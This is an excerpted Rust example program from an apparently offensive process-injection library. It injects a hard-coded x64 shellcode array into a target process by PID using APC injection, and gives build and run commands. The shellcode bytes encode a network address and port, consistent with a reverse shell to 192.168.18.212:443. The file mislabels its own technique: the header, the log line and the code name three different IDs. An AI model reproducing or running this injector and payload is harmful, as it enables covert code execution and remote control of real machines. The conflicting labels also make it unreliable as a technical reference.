//! Example: T1055.004 - Remote Thread Injection
//!
//! ## Requirements
...
//! ```sh
//! cargo build --package injectum --example T1055_004_Sniper_APC --features "tracing,T1055_004" --release
//! ```
//!
//! ## Usage
//! ```sh
//! ./T1055_004_Sniper_APC.exe <PID>
//! ```
...
const SHELLCODE: &[u8] = &[
    ...
    0x20, 0x4d, 0x31, 0xc9, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x48, 0x31, 0xc0,
    ...
    0xd6, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
    ...
    0x49, 0xbc, 0x02, 0x00, 0x01, 0xbb, 0xc0, 0xa8, 0x12, 0xd4, 0x41, 0x54, 0x49, 0x89, 0xe4, 0x4c,
...
fn run() -> Result<(), InjectumError> {
    ...
    info!("Technique         : T1055.002 (SniperAPCInjection)");
    info!("------------------------------------------------");
...
fn inject_shellcode(pid: u32) -> Result<(), InjectumError> {
    ...
    let strategy = StrategyType::new(Technique::T1055_004, Some("SniperAPCInjection"));
...
fn print_usage() {
    println!("Usage:");
    println!("  T1055_004_Sniper_APC.exe <PID>");
}
